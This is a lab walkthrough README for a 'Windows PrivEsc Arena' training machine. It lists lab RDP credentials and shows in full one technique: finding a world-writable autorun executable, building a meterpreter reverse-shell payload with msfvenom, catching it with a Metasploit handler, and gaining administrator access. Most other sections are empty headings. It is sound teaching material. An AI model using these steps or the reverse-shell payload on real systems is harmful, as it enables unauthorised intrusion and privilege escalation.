# Windows PrivEsc Arena

<img width="1902" height="361" alt="image" src="https://github.com/user-attachments/assets/96706b9f-7faa-4ad5-8d3f-965cd8c67d44" />

---

>[!important]
> ### Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:
> #### **`username`** : user
> #### **`password`** : password321
>
> ### `For any administrative actions you might take, your credentials are:`
> #### **`username`** : TCM
> #### **`password`** : Hacker123
>

---

>[!warning]
> ### Connect To Target
> ```ruby
> xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.103.25
> ```
> **`Or`**
>
>```ruby
> rdesktop 10.10.103.25 -u user -p password321
>```

---

<details>
  <summary>Registry Escalation</summary>





- <details>
      <summary>Autorun</summary>





Windows Privilege Escalation: Insecure Autorun Permissions
==========================================================

This guide demonstrates a privilege escalation technique by exploiting an executable in an autorun location that has insecure file permissions. The goal is to replace the legitimate program with a malicious payload, which will be executed with higher privileges when an administrator logs in.

🕵️‍♂️ Detection
----------------

First, we need to identify the vulnerable autorun program and confirm its weak permissions.

1.  Scan for Autorun Programs

    Open a command prompt on the Windows VM and run Autoruns to inspect programs that launch on startup.

    

    ```DOS
    C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

    ```

2.  Inspect Logon Items

    In the Autoruns window, click on the Logon tab to see all applications that run when a user logs in.

3.  Identify the Target Program

    From the list, notice the "My Program" entry. Observe that it points to the following executable:

    ```
    C:\Program Files\Autorun Program\program.exe

    ```

4.  Check File Permissions

    Return to the command prompt and use accesschk64.exe to check the permissions on the program's directory.

    

    ```DOS
    C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

    ```

5.  Confirm the Vulnerability

    The output will show that the Everyone user group has ``FILE_ALL_ACCESS`` permission. This is the vulnerability, as it means any user can modify or replace the program.exe file.

💥 Exploitation
---------------

The exploitation process involves creating a malicious payload, setting up a listener to receive the connection, and replacing the original executable.

### 1\. Setting Up the Listener & Payload (Kali VM)

First, we will use the Metasploit Framework to create a reverse shell payload and a listener to catch the connection.

1.  **Start Metasploit**

    

    ```Bash
    msfconsole

    ```

2.  Configure the Multi/Handler

    This module will listen for the incoming connection from our payload.

    

    ```Ruby
    msf6 > use multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>

    ```

3.  Start the Listener

    The listener will now wait for a connection.

    

    ```Ruby
    msf6 exploit(multi/handler) > run

    ```

4.  Generate the Malicious Payload

    Open a new terminal window on your Kali VM. Use msfvenom to create a malicious program.exe that will connect back to your listener.

    

    ```Bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f exe -o program.exe

    ```

5.  Transfer the Payload

    Copy the newly generated program.exe file from your Kali VM to the Windows VM's desktop.

### 2\. Planting the Payload (Windows VM)

1.  On the Windows VM, replace the original program with your malicious payload. You can do this via the command line or file explorer:

    

    ```DOS
    move C:\Users\User\Desktop\program.exe "C:\Program Files\Autorun Program\program.exe"

    ```

    *(Confirm overwrite if prompted)*

2.  To trigger the exploit, you must simulate the condition under which the program runs with elevated privileges. **Log off** from the current user session and then **log back on as an administrator**.

✅ Gaining Access & Verification
-------------------------------

When the administrator logs in, the malicious `program.exe` will execute and connect back to your listener on the Kali VM.

1.  Catch the Session

    In your Metasploit terminal, you will see a new session being created.

    ```
    [*] Meterpreter session 1 opened (...)

    ```

2.  Interact with the Session

    Enter the new session using its ID.

    

    ```Ruby
    msf6 exploit(multi/handler) > sessions -i 1

    ```

3.  Verify Privileges

    To confirm that the attack was successful and you have escalated privileges, run the getuid command. The output should show that you are running as the administrator user.

    

    ```Ruby
    meterpreter > getuid

    ```






  </details>




- <details>
      <summary>AlwaysInstallElevated</summary>
  </details>





  
</details>













<details>
  <summary>Service Escalation</summary>






- <details>
      <summary>Registry</summary>
  </details>


- <details>
      <summary>Executable Files</summary>
  </details>


- <details>
      <summary> DLL Hijacking</summary>
  </details>


- <details>
      <summary>binPath</summary>
  </details>


- <details>
      <summary>Unquoted Service Paths</summary>
  </details>
  
  
  
  






  
</details>
















<details>
  <summary>Privilege Escalation - Startup Applications</summary>
</details>


<details>
  <summary>Potato Escalation - Hot Potato</summary>
</details>








<details>
  <summary>Password Mining Escalation</summary>





- <details>
      <summary> Configuration Files</summary>
  </details>



- <details>
      <summary>Memory</summary>
  </details>





  
</details>



<details>
  <summary>Privilege Escalation - Kernel Exploits</summary>
</details>











